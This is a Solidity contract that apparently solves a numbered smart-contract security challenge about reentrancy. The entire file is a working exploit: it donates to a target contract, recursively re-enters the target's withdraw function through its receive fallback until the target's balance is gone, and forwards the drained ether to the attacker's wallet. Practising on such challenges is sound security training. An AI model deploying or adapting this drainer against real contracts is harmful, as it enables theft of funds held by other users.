// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../interfaces/10/Reentrance.sol";

contract ReentrancyAttack {
    Reentrance reentrance;
    address payable myWallet;
    uint256 initialDeposit;

    constructor(address payable _reentranceAddr, address payable _myWallet) {
        reentrance = Reentrance(_reentranceAddr);
        myWallet = _myWallet;
    }

    function attack() external payable {
        require(msg.value >= 0.1 ether);
        initialDeposit = msg.value;

        reentrance.donate{value: msg.value}(address(this));
        recursiveWithdraw();
    }

    function recursiveWithdraw() internal {
        uint256 remainingBalance = address(reentrance).balance;
        bool recursion = remainingBalance > 0;

        if (recursion) {
            uint256 withdrawAmount = initialDeposit <= remainingBalance
                ? initialDeposit
                : remainingBalance;
            reentrance.withdraw(withdrawAmount);
        }
    }

    receive() external payable {
        recursiveWithdraw();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function withdraw() external {
        myWallet.transfer(address(this).balance);
    }
}
